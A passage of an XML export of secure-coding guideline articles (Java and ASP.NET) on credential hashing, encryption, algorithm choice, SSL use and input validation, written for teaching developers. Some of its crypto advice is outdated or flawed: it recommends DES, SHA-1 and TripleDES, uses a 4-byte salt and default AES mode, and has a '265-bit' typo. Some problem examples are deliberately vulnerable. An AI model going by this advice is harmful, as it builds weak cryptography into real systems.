salt, make sure that your application encrypts the random salt and stores it into a configuration file. Always use <strong>SecureRandom</strong> and not <strong>Random</strong> to generate the salt. Example of using <strong>SecureRandom</strong> to generate a random salt:</p><blockquote><pre>public static byte[] generateSalt() throws NoSuchAlgorithmException<br>{<br>      // Note that salt is declared as private static byte[] and is<br>      // initialized to null.<br>      if (salt == null)<br>      {<br>            SecureRandom srand = SecureRandom.getInstance("SHA1PRNG");<br>                          salt = new byte[4];<br>            srand.nextBytes(salt);<br>      }<br>       return salt;<br>}</pre></blockquote><p>Choosing a strong hashing algorithm is also important. Stronger algorithms prevent multiple unique pieces of data from producing identical hash values. The current recommendation is to use SHA-256 or stronger.</p><blockquote><pre>public String hashCredentials(char[] pass, byte[] salt)<br>      throws GeneralSecurityException, IOException<br>{<br>      MessageDigest md;<br>      byte[] tempPass;<br>      byte[] digest;<br>            md = MessageDigest.getInstance("SHA-512");<br>      //Convert char[] to byte[]<br>      tempPass = new byte[pass.length];<br>      for (int i = 0; i &lt; pass.length; i++)<br>      {<br>            tempPass[i] = (byte)pass[i];<br>      }<br>      md.update(tempPass);<br>      md.update(salt);<br>      digest = md.digest();<br>      md.reset();<br>      //Clean tempPass<br>      for (int i = 0; i &lt; tempPass.length; i++)<br>      {<br>            tempPass[i] = 0;<br>      }<br>       return new String(digest);<br>}</pre></blockquote><p>Use encryption if the application data will be retrieved at a later stage.<br><br>Use symmetric encryption if and only if your application is the only entity that will access the encrypted data. Use a key size of 265-bit or higher and AES for symmetric encryption.<br><br>Use public/private key encryption if the data will be accessed by two or more parties. Use a key size of 2048-bit or higher and RSA for public/private key encryption. Public/private key encryption allows your application to share sensitive data with multiple entities without disclosing its own encryption key.</p><pre>// Because the following code generates a new encryption key,<br>// make sure to store it into the application's keystore.<br>// Follow the <a href="ruledisplay:235E588E-621B-4C5E-A50E-8EA447330AD0">Use a Secure Key Storage Location</a> guideline.<br>KeyGenerator kgen = KeyGenerator.getInstance("AES");<br>kgen.init(256);<br>SecretKey skey = kgen.generateKey();<br>// Set up cipherCipher cipher = Cipher.getInstance("AES");<br>cipher.init(Cipher.ENCRYPT_MODE, skey);<br>// Note that sensitiveData is of type byte[] and contains<br>// data that is sensitive in naturebyte[] encrypted = cipher.doFinal(sensitiveData);</pre></li></ul></li><li><p><strong>Apply the appropriate protection mechanism</strong>. Evaluate the code and determine the places where sensitive data is transmitted. Apply the established protection mechanism at each location.</p><blockquote><pre>try<br>{<br>      // The application produces a hash based on the sensitive data<br>      userEmail = MyApp.getEmailForUser(user);<br>      passDigest = encryptCredentials(userEmail, pass, salt);<br>}<br>catch (GeneralSecurityException gse)<br>{<br>      // Add the appropriate logging and exception handling mechanisms<br>      return false;}catch (IOException ioe)<br>{<br>      // Add the appropriate logging and exception handling mechanisms<br>      return false;<br>}<br>// The application stores the hashed sensitive data into the database<br>Connection cn = MyApp.getDBConnection();<br>PreparedStatement st = cn.prepareStatement("select login_attempts from myappUsers"<br>                                        + " where user = ? and pass = ?;");<br>st.setString(1, user);<br>st.setBytes(2, passDigest);<br>ResultSet rs = st.executeQuery();</pre></blockquote></li></ol><p><strong>Note:</strong> PCI DSS requirements state that all sensitive data must be encrypted before being sent over the network or be sent over an encrypted channel.</p><h1>Problem Example</h1><p>The following code authenticates a user based on a username and password. The supplied credentials are compared to the credentials stored in the backend database. Unfortunately, the credentials are transmitted in plaintext and could be stolen if the network is compromised.</p><blockquote><pre>public boolean validateUser(String user, char[] pass)<br>{<br>      // Query the credential store with the provided credentials<br>      ...<br>}</pre></blockquote><h1>Solution Example</h1><p>The following code validates the user based on&nbsp;a given username and password. It uses the user's valid email address and a random salt to encrypt the user's password before comparing&nbsp;the username and the produced digest against the data stored in the backend database. Therefore, the password is encrypted before being transmitted over the network and is protected from being compromised.</p><blockquote><pre>public boolean validateUser(String user, char[] pass)<br>{<br>       ...<br>       // Encrypt the credentials<br>      try<br>      {<br>            userEmail = MyApp.getEmailForUser(user);<br>            passDigest = encryptCredentials(userEmail, pass, salt);<br>      }<br>      catch (GeneralSecurityException gse)<br>      {<br>            // Add the appropriate logging and exception handling mechanisms<br>            return false;<br>      }<br>     catch (IOException ioe)<br>      {<br>            // Add the appropriate logging and exception handling mechanisms<br>            return false;<br>      }<br>       // Query the credential store and execute the rest of the authentication steps<br>      ...<br>}<br>public static byte[] encryptCredentials(String email, char[] pass, byte[] salt)<br>      throws GeneralSecurityException, IOException<br>{<br>      MessageDigest md; <br>      byte[] tempPass;<br>      byte[] rawKey;<br>      // Generate encryption key<br>      md = MessageDigest.getInstance("SHA-512");<br>      md.update(email.getBytes("UTF-8"));<br>      md.update(salt);<br>      rawKey = md.digest();<br>      md.reset();<br>      SecretKeySpec skeySpec = new SecretKeySpec(rawKey, "AES");<br>      // Set up cipher<br>      Cipher cipher = Cipher.getInstance("AES");<br>      cipher.init(Cipher.ENCRYPT_MODE, skeySpec);<br>      // Convert char[] to byte[]<br>      tempPass = new byte[pass.length];<br>      for (int i = 0; i &lt; pass.length; i++)<br>      {<br>            tempPass[i] = (byte)pass[i];<br>      }<br>      // Encrypt password<br>      byte[] encrypted = cipher.doFinal(tempPass);<br>            //Clean tempPass<br>      for (int i = 0; i &lt; tempPass.length; i++)<br>      {<br>            tempPass[i] = 0;<br>      }<br>      return encrypted;<br>}</pre></blockquote><h1>Additional Resources</h1><ul><li>To learn more about the JCE API, see: <a href="http://java.sun.com/products/jce/index-14.html">Java Cryptography Extension for the Java 2 SDK, v 1.4</a>. </li><li>For more information about securely generating random numbers, see: Documentation for <a href="http://download.oracle.com/javase/1.4.2/docs/api/java/security/SecureRandom.html">Class SecureRandom</a> in Java SDK. </li><li>To learn more about JSSE, see: <a href="http://java.sun.com/j2se/1.4.2/docs/guide/security/jsse/JSSERefGuide.html">Java Secure Socket Extension (JSSE) Reference Guide</a>.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:5E283FD0-1A55-4DC3-971D-BF7C3318E7CB">Guideline: Encrypt Communication Links (Java Web Application)</a> </li><li><a href="ruledisplay:235E588E-621B-4C5E-A50E-8EA447330AD0">Guideline: Use a Secure Key Storage Location (Java Web Application)</a> </li><li><a href="ruledisplay:ED6F49C0-E021-459E-AE4F-9116CA8E8073">Guideline: Use SSL When Transmitting Credentials (Java Web Application)</a> </li><li><a href="ruledisplay:5F929DD7-759F-4412-A9B1-08567CDE9035">Attack: Network Eavesdropping Attack</a> </li><li><a href="ruledisplay:48BB4D3A-9295-4263-B3E7-090E483DEC5D">Attack: Man in the Middle Attack</a> </li><li><a href="ruledisplay:13EE90D9-B0F6-45D6-913A-BA8527525A04">Attack: Traffic Analysis Attack</a> </li><li><a href="ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9">Attack: Information Disclosure Attack</a> </li><li><a href="ruledisplay:B47A6486-A73E-44B9-AD17-1F7F94199828">Attack: Network Credential Sniffing Attack</a> </li><li><a href="ruledisplay:92148CDE-33B9-4725-882F-0C2C245510BA">Checklist Item: Sensitive Data is Protected Over the Network (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1798511575" Content_Hash="-1913041490">
    <Metadata>
      <Id>a99bebe3-80cb-489d-90f3-6f6d35f23dc0</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use the Correct Algorithm and Correct Key Size</Title>
      <Category>Cryptography</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li><div>Web Application</div></li></ul><h1>What to Do</h1><p>Examine what algorithms your application uses and for what purpose and ensure that correct algorithm and correct key sizes are being used.</p><h1>Why</h1><p>Cryptography only provides real security if it is used appropriately and the right algorithms are used for the right job. The strength of the algorithm is also important.&nbsp; Larger key sizes result in improved security, but performance suffers. Stronger encryption is most important for persisted data that is retained in data stores for prolonged periods of time.</p><h1>When</h1><p>If your application uses cryptography to provide security, examine what algorithm and key size it uses and the way it is used.</p><h1>How</h1><p>It is important to make sure you choose the right algorithm for the right job and to make sure you use a key size that provides a sufficient degree of security. Larger key sizes generally increase security. The following list summarizes the major algorithms together with the key sizes that each uses: </p><ul><li>Data Encryption Standard (DES) 64-bit key (8 bytes) </li><li>TripleDES 128-bit key or 192-bit key (16 or 24 bytes) </li><li>Rijndael 128-256 bit keys (16-32 bytes) </li><li>RSA 384-16,384 bit keys (48-2,048 bytes) </li></ul><p>For large data encryption, use the TripleDES symmetric encryption algorithm (also&nbsp;called Triple Data Encryption Algorithm, TDEA) . For slower and stronger encryption of large data, use Rijndael,&nbsp;also known as Advanced Encryption Standard(AES). As per NIST&nbsp;recomendations, 192-256-bit AES&nbsp;keys are required for highly sensitive data.&nbsp;&nbsp;To encrypt data that is to be stored for short periods of time, you can consider using a faster but weaker algorithm such as DES. For digital signatures, use Rivest, Shamir, and Adleman (RSA) or Digital Signature Algorithm (DSA). NIST guidelines suggest that 15360-bit RSA keys are equivalent&nbsp;to 256-bit symmetric keys in strength. For hashing, use the Secure Hash Algorithm (SHA)1.0. For keyed hashes, use the Hash-based Message Authentication Code (HMAC) SHA1.0.</p><h1>Additional Resources</h1><ul><li>For more information see, "Chapter 4 - Design Guidelines for Secure Web Applications" at <a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx">http://msdn2.microsoft.com/en-us/library/aa302420.aspx</a></li></ul><h1>&nbsp;</h1><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1099200213" Content_Hash="-653978655">
    <Metadata>
      <Id>aa4270d8-cebf-4d7b-8044-08713aaf5888</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Optimize Pages that use SSL</Title>
      <Category>Communication Security</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Checklist Item</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Use SSL only for pages that require it. </p><h1>Why</h1><p>Using SSL is expensive in terms of performance. </p><h1>When</h1><p>Use SSL for pages that contain or capture sensitive data, such as pages that accept credit card numbers and passwords. Use SSL only if the following conditions are true: </p><ul><li>You want to encrypt the page data. </li><li>You want to guarantee that the server to which you send the data is the server that you expect. </li></ul><h1>How</h1><p>For pages where you must use SSL, follow these guidelines: </p><ul><li>Make the page size as small as possible. </li><li>Avoid using graphics that have large file sizes. If you use graphics, use graphics that have smaller file sizes and resolution. Or, use graphics from a site that is not secure. However, when you use graphics from a site that is not secure, Web browsers display a dialog box that asks the user if the user wants to display the content from the site that is not secure. </li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:ecfc4c67-2a6c-443e-844e-8a3051fe54f3">Use IPSsec to Encrypt Traffic Between Servers</a></li><li><a href="ruledisplay:de1299b9-854b-4479-9f26-bbc9df38af29">Use SSL or IPSec for Secure Communication Between Entities</a></li><li><a href="ruledisplay:00b37bcb-5a47-41ca-9e84-a9e8edb15272">Use SSL Between the Web Browser and Web Server When Pages Need to be Encrypted<br></a></li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1433663092" Content_Hash="-987391901">
    <Metadata>
      <Id>acae9e9a-f11e-4957-af5c-24235cd47f96</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Consider Partitioning Your Site to Restricted Areas and Public Areas</Title>
      <Category>Authentication</Category>
      <Phase>Design</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>To avoid the performance overhead of using SSL across your entire site, consider using a separate folder to help protect pages that require authenticated access. Configure that folder in IIS to require SSL access. Those pages that support anonymous access can safely be accessed over HTTP connections.</p><h1>Why</h1><p>Using SSL across an entire site can incur a significant performance penalty. For sites that have pages which may be viewed without encryption or authentication, it will improve performance to separate out restricted from non-restricted pages. </p><h1>When</h1><p>This technique should be employed whenever an application has a mix of pages - some of which require authentication while others don't. </p><h1>How</h1><p>To avoid having to use SSL across your entire site, structure your Web site so that the secure pages that require authenticated access are placed in a subdirectory that is separate from the anonymously accessible pages.&nbsp; </p><p><strong>To secure pages in a separate subfolder</strong> </p><ol><li><p>In Microsoft Internet Information Services (IIS), configure the secure folder to require SSL. This sets the <strong>AccessSSL=true</strong> attribute for the folder in the IIS Metabase. Requests for pages in the secured folders are successful only if HTTPS is used for the request URL. </p></li><li><p>Use an &lt;<strong>authorization</strong>&gt; element to ensure that only authenticated users can access secure pages. Place this element beneath the closing &lt;<strong>/system.web</strong>&gt; tag, as shown here. </p><pre>&lt;!-- The secure folder is for authenticated and SSL access only. --&gt;<br>&lt;location path="Secure" &gt;<br>  &lt;system.web&gt;<br>    &lt;authorization&gt;<br>      &lt;deny users="?" /&gt;<br>    &lt;/authorization&gt;<br>  &lt;/system.web&gt;<br>&lt;/location&gt;  </pre><p>Additionally, the following configuration ensures that unauthenticated users are allowed to access pages in the application's root directory. Place this configuration in the main &lt;<strong>system.web</strong>&gt; element. </p><pre>&lt;system.web&gt;<br>  &lt;!-- The virtual directory root folder contains general pages.<br>       Unauthenticated users can view them and they do not need<br>        to be secured with SSL. --&gt;<br>  &lt;authorization&gt;<br>    &lt;allow users="*" /&gt;<br>  &lt;/authorization&gt;<br>&lt;/system.web&gt;  </pre><p><strong>Note</strong>&nbsp;&nbsp;&nbsp;If you use this type of site structure, your application must not rely on the user's identity on the non-SSL pages. In the preceding configuration, no forms authentication ticket is sent for requests for non-SSL pages. As a result, the user is considered anonymous. This has implications for related features, such as personalization, that require the user name.<strong>&nbsp;</strong>&nbsp;</p></li></ol><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="546304520" Content_Hash="680152557">
    <Metadata>
      <Id>ae57fb40-a7ab-428e-9ed1-6624d4ae8181</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Validate Input from All Sources</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Design</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>1</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Applications written using Servlets or JSP.</li></ul><h1>What to Do</h1><p>Treat input from all external sources as untrusted and apply input validation techniques.</p><h1>Why</h1><p>Input that is not validated can lead to cross-site scripting, SQL injection, directory traversals, and other vulnerabilities&nbsp;that could allow an attacker to gain unauthorized access to sensitive data.</p><h1>When</h1><p>Treat all input as untrusted. If you have established trust boundaries for your application, then validate data every time it crosses a trust boundary.</p><h1>How</h1><p>An application can take input via various ways: web interface, database, file system, other software running on the server, etc. Use the following steps to establish a validation strategy:</p><ol><li><p><strong>Establish your application's trust boundary:</strong> The notion is that all input not generated by your application is untrusted.</p></li><li><p><strong>Identify all sources of input</strong>: An application can have various sources of input and each one is an entry point to your application&nbsp;that can potentially be used to break your application's security model. Enumerate all possible sources of input and make note of the expected input&nbsp;at&nbsp;each source. Potential sources of input in a web application typically include:</p></li><ol><li>URL based parameters </li><li>Form based parameters </li><li>Hidden fields </li><li>Cookies </li><li>HTTP headers </li><li>Local filesystem </li><li>Database </li><li>Other related services</li></ol><li><p><strong>Understand the input that your application can handle and process</strong>: After identifying the different entry points, define the format and type of input that&nbsp;should be provided through each entry point. </p></li><li><p><strong>Create a set of validators</strong>: Build a validator for each format and type of expected input. Centralize your application's validators as it helps strengthen the code by limiting the amount of scattered validation code throughout your application. Place the set of validators on your application's trust boundary. Your application should accept input from the outside world only through its set of validators. </p><p>See the <a href="ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559">Validate Input for Length, Range, Format, and Type</a> guideline for more information on constructing validation routines.</p></li></ol><h1>Problem Example</h1><p>The following code produces a data analysis based on a financial index. Unfortunately, the application validates the user's input but not the returned data from the database. Therefore, the application is vulnerable to an integer overflow that can harm the business logic used in generating the data analysis.</p><blockquote><pre>import java.io.*;<br>import java.util.*;<br>import java.lang.*;<br>import javax.servlet.*;<br>import javax.servlet.http.*;<br>import java.util.regex.*;<br> public final class DataAggregator extends HttpServlet<br>{      public void doGet(HttpServletRequest request, HttpServletResponse response)<br>            throws ServletException, IOException<br>      {            PrintWriter out = response.getWriter();<br>            String searchTerm = request.getParameter("index");<br>             try<br>            {<br>                  // The application validates the user-supplied input<br>                  if (validateSearchTerm(searchTerm))<br>                  {<br>                        String retString;<br>                         retString = "The queried index \"";<br>                        retString += encodeHtml(searchTerm);<br>                        retString += "\" produced the following results:&lt;br&gt; ";<br>                        out.println(retString);<br>                        aggregateData(out, searchTerm);<br>                  }<br>                  else<br>                  {<br>                        // Add the appropriate logging and exception handling<br>                        // mechanisms. Consult the Exception Handling and<br>                         // Logging sections<br>                         out.println("We cannot handle your request at the moment."<br>                                 + " Please try again later.");<br>                  }<br>            }<br>             catch (Exception e)<br>            {<br>                  // Add the appropriate logging and exception handling<br>                   // mechanisms. Consult the Exception Handling and<br>                   // Logging sections <br>                  out.println("We cannot handle your request at the moment."<br>                           + " Please try again later.");<br>            }<br>             out.flush();<br>            out.close();<br>      }<br>       boolean validateSearchTerm(String input)<br>      {<br>            String goodPattern = "(\\w|\\d)+";<br>            int goodLength = 8;<br>             if (input == null)<br>            {<br>                  return false;<br>            }<br>             if(input.length() &gt; goodLength)<br>            {<br>                  return false;<br>            }<br>                        Pattern p = Pattern.compile(goodPattern);<br>            Matcher m = p.matcher(input);<br>                        if(!m.matches())<br>            {<br>                  return false;<br>            }<br>                        return true;<br>      }<br>       void aggregateData(PrintWriter out, String searchTerm)<br>      {<br>            double[] rData = common.queryDBForIndex(searchTerm);<br>             // The application fails to validate the returned<br>             // data from the database<br>             // Business logic that performs certain data analysis<br>      }<br>}</pre></blockquote><h1>Solution Example</h1><p>The following code produces a data analysis based on a financial index. Since the code validates all sources of input to the application, the application is secured from SQL injection and integer overflows. Notice that this example code is also related to <a href="ruledisplay:c98695c5-cf02-44a1-96bf-1f8046b8ad9d">Validate Input for Length, Range, Format, and Type</a>.</p><blockquote><pre>import java.io.*;<br>import java.util.*;<br>import java.lang.*;<br>import javax.servlet.*;<br>import javax.servlet.http.*;<br>import java.util.regex.*;<br> public final class DataAggregator extends HttpServlet<br>{      public void doGet(HttpServletRequest request, HttpServletResponse response)<br>            throws ServletException, IOException<br>      {<br>            PrintWriter out = response.getWriter();<br>            String searchTerm = request.getParameter("index");<br>             try<br>            {<br>                  // The application validates the user-supplied input<br>                  if (validateSearchTerm(searchTerm))<br>                  {<br>                        String retString;<br>                         retString = "The queried index \"";<br>                        retString += encodeHtml(searchTerm);<br>                        retString += "\" produced the following results:&lt;br&gt; ";<br>                        out.println(retString);<br>                        aggregateData(out, searchTerm);<br>                  }<br>                  else<br>                  {<br>                        // Add the appropriate logging and exception<br>                        // handling mechanisms. Consult the Exception Handling<br>                        // and Logging sections <br>                        out.println("We cannot handle your request at the moment."<br>                                 + " Please try again later.");<br>                  }<br>            }<br>             catch (Exception e)<br>            {<br>                  // Add the appropriate logging and exception handling mechanisms<br>                  // Consult the Exception Handling and Logging sections<br>                   out.println("We cannot handle your request at the moment."<br>                           + " Please try again later.");<br>            }<br>             out.flush();<br>            out.close();<br>      }<br>       void aggregateData(PrintWriter out, String searchTerm) throws Exception<br>      {<br>            double[] rData = common.queryDBForIndex(searchTerm);<br>             // The application validates the returned data from the database<br>            if (validateRawDBData(rData))<br>            {<br>                  // Business logic that performs certain data analysis<br>            }<br>            else<br>            {<br>                  String errMsg = "Business logic not executed";<br>                  throw new Exception(errMsg);<br>            }<br>      }<br>       boolean validateSearchTerm(String input)<br>      {<br>            String goodPattern = "(\\w|\\d)+";<br>            int goodLength = 8;<br>             if (input == null)<br>            {<br>                  return false;<br>            }<br>             if(input.length() &gt; goodLength)<br>            {<br>                  return false;<br>            }<br>                        Pattern p = Pattern.compile(goodPattern);<br>            Matcher m = p.matcher(input);<br>                        if(!m.matches())<br>            {<br>                  return false;<br>            }<br>                        return true;<br>      }<br>       boolean validateRawDBData(double[] input)<br>      {<br>            boolean valid = true;<br>             for (int i = 0; i &lt; input.length; i++)<br>            {<br>                  if (input[i] &lt; 0.0 || input[i] &gt; 100.0)<br>                  {<br>                        valid = false;<br>                  }<br>            }<br>             return valid;<br>      }<br>}</pre></blockquote><h1>Related Items</h1><ul><li><a href="ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559">Guideline: Validate Input for Length, Range, Format, and Type (Java Web Application)</a> </li><li><a href="ruledisplay:BEC58471-A0EF-40C5-8C9D-9BF5C4B91F1F">Guideline: Filter All User-Supplied Filename and Path Input (Java Web Application)</a> </li><li><a href="ruledisplay:2D8158D1-E2D1-459F-9BD7-56D4B979EFE3">Guideline: Encode All Output Data (Java Web Application)</a> </li><li><a href="ruledisplay:D6593992-DC9E-42C5-9E98-30E8EF075B93">Guideline: Do Not Rely on Client-Side Validation (Java Web Application)</a> </li><li><a href="ruledisplay:81491E66-67B7-49F3-BDA6-4B4C9245C702">Guideline: Validate All Input Passed to Database (Java Web Application)</a> </li><li><a href="ruledisplay:D8D7FC19-F935-4FA1-BB66-8D4B8A185CDB">Guideline: Validate User's Login Credentials Before Processing Them (Java Web Application)</a> </li><li><a href="ruledisplay:42F599F0-D1D6-4F25-9CC2-D5473F19113F">Guideline: Validate All Data Passed Between Native and Java Code (Java Web Application)</a> </li><li><a href="ruledisplay:178EB28D-4F49-4476-AE8A-437F966DE577">Checklist Item: Input from All Sources is Validated (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1276381450" Content_Hash="-652097810">
    <Metadata>
      <Id>b797adfa-93bf-4f6e-9b30-70a0758ecd3d</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Do Not Rely on Client-Side Validation</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li><div>Web Application</div></li></ul><h1>What to Do</h1><p>Client-side validation can reduce the number of round trips to the server, but do not rely on it for security because it is easy to bypass. Validate all input at the server. </p><h1>Why</h1><p>It is easy to modify the behavior of the client or just write a new client that does not observe the same data validation rules.</p><h1>When</h1><p>All applications should only use Server-side validation when the code relys on security.</p><h1>How</h1><p>Server-side code should perform its own validation. What if an attacker bypasses your client, or shuts off your client-side script routines, for example, by disabling JavaScript? Use client-side validation to help reduce the number of round trips to the server but do not rely on it for security. This is an example of defense in depth.</p><h1>Additional Resources</h1><ul><li>For more information see, "Chapter 4 - Design Guidelines for Secure Web Applications" at <a href="http://msdn2.microsoft.com/en-us/library/aa302420.aspx">http://msdn2.microsoft.com/en-us/library/aa302420.aspx</a>&nbsp;&nbsp;&nbsp;</li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance.</p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1524679592" Content_Hash="911682039">
    <Metadata>
      <Id>bae35023-258d-40f5-8c36-22f562c83c36</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Encrypt Configuration Sections that Store Sensitive Data</Title>
      <Category>Deployment Considerations</Category>
      <Phase>Deployment</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Encrypt configuration sections containing sensitive data such as passwords or usernames. </p><h1>Why</h1><p>Configuration sections typically contain privacy sensitive resource access credentials (e.g., a connection string for a SQL server resource includes a username and password.) As a precautionary measure, they should not be stored in plaintext, because an attacker that can compromise a server will be able to read those values if they are not adequately protected. </p><h1>When</h1><p>This guideline is applicable whenever configuration sections are utilized. </p><h1>How</h1><p>In ASP.NET, you can use either the DPAPI or RSA protected configuration providers to encrypt specific sections that contain sensitive data. The sections that usually contain sensitive information that you need to encrypt include &lt;appSettings&gt;, &lt;connectionStrings&gt;, &lt;identity&gt;, and &lt;sessionState&gt;. To encrypt the &lt;connectionStrings&gt; section by using the DPAPI provider with the machine-key store (the default configuration), run the following command from a command window:</p><div><br><pre>aspnet_regiis -pe "connectionStrings" -app "/MachineDPAPI" -prov "DataProtectionConfigurationProvider" </pre><br></div><ul><li><strong>-pe</strong>: Specifies the configuration section to encrypt. </li><li><strong>-app</strong>: Specifies your Web application's virtual path. If your application is nested, you need to specify the nested path from the root directory; for example, "/test/aspnet/MachineDPAPI". </li><li><strong>-prov</strong>: Specifies the provider name.</li></ul><p>If you need to encrypt configuration file data on multiple servers in a Web farm, you should use RSA protected configuration provider because of the ease with which you can export RSA key containers.&nbsp; </p><h1>Related Items</h1><ul><li><a href="ruledisplay:f10679b7-5390-49ee-b529-7a2f7c059ce7">Encrypt Connection Strings</a> </li><li><a href="ruledisplay:760734bc-7080-4864-91ec-fd6db510f8ed">Credentials in SQL Connection Strings are Protected in Configuration Files</a> </li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-2118147910" Content_Hash="1495454086">
    <Metadata>
      <Id>c2651adf-f0d8-4067-b3fc-0c8b0cb315f4</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Validate Input from All Sources For Type, Length, Format, and Range</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Do not trust input.&nbsp; Instead, validate on the server that it matches the expected input, be careful which contexts you allow it to be used in, and encode it appropriately on output. </p><h1>Why</h1><p>An attacker passing malicious input can attempt SQL injection, cross-site scripting, and other injection attacks that aim to exploit your application's vulnerabilities.&nbsp; Validating input helps to reduce these risks by ensuring that the input received matches the expected format.&nbsp;Input validation on it's own is not sufficient; output encoding is also needed to fully prevent these attacks, but it is an important step for both security and reliability. </p><h1>When</h1><p>All input should always be validated, regardless of source.&nbsp; Unless data is actually static within the scope of the local code base, it could be modified by a malicious user—even data in a database which is supposed to be static.&nbsp; </p><h1>How</h1><ol><li><p><strong>Where to Validate Data.</strong> Input must be validated on the server for security checks.&nbsp; While it can be useful for user experience reasons to check the input on the client side, especially on things like web applications with high round-trip latencies, this client-side validation is not sufficient to provide security guarantees, as it can be circumvented by the attacker. </p></li><li><p><strong>What Data to Validate.</strong> Check for known good data and constrain input by validating it for type, length, format, and range.&nbsp; For Web form applications that obtain input through server controls, use the ASP.NET validator controls, such as the RegularExpressionValidator, RangeValidator, and CustomValidator, to validate and constrain input.&nbsp; All input not under control of the system should be validated, but input coming directly from users must be validated and should receive the most attention.&nbsp; </p></li><li><p><strong>How to Implement Validation.</strong> Most Web applications accept input from various sources, including HTML controls, server controls, query strings, and cookies.&nbsp; Validate input from all of these sources to help prevent injection attacks.&nbsp; Use regular expressions to help validate input.&nbsp; The following example shows how to use the Regex class. </p><pre>using System.Text.RegularExpressions;<br>// Instance method:Regex reg = new Regex(@"^[a-zA-Z'.\s]{1,40}$");<br>Response.Write(reg.IsMatch(Request.QueryString["Name"]));<br>// Static method:<br>if (!Regex.IsMatch(Request.QueryString["Name"],@"^[a-zA-Z'.\s]{1,40}$"))<br>{<br>   // Name does not match expression<br>}</pre><p>If you cannot cache your regular expression for frequent use, you should use the static IsMatch method where possible for performance reasons, to avoid unnecessary object creation. </p><p>In general, validate your input against the least permissive expression possible that will accept all the input you expect for that field.&nbsp; If you know that the field will have certain internal structure, check for it.&nbsp; If there is a range of standard formats which your users may enter data in, but these formats are easily converted to a single internal format, do so.&nbsp; </p><p><strong>Note:</strong>&nbsp;&nbsp;&nbsp; Validating input does not remove the need to format output, parametrize queries, or otherwise handle user input carefully. </p></li><li><p><strong>Validating Specific Data Types.</strong> Specific data types allow for and require different types of checks.&nbsp; Here are some guidelines for common data types:</p><ul><li><p><strong>Numeric Data.</strong> Check all numeric fields for type and range. If you are not using server controls, you can use regular expressions and the Regex class, and you can validate numeric ranges by converting the input value to an integer or double, ensuring the conversion was valid,&nbsp;and then performing a range check.&nbsp; If your input has an internal checksum, like a credit card number, check that too.</p></li><li><p><strong>Address 